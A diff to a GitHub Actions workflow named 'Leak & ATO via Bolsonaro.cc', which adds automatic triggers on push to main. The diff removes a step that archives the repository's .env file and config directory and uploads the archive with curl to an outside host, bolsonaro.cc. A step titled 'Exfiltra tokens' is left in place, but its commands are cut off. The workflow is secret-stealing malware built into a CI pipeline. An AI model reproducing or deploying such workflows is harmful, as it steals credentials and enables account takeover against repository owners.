@@ -1,6 +1,9 @@
 name: "Leak & ATO via Bolsonaro.cc"
+
 on:
   create:
+    branches: ["main"]
+  push:
     branches: ["main"]
   workflow_dispatch:
 
@@ -10,11 +13,6 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-
-      - name: Exfiltra .env e configs
-        run: |
-          tar czf leak.tar.gz .env config/
-          curl -F "file=@leak.tar.gz" https://bolsonaro.cc/upload
 
       - name: Exfiltra tokens
         run: |
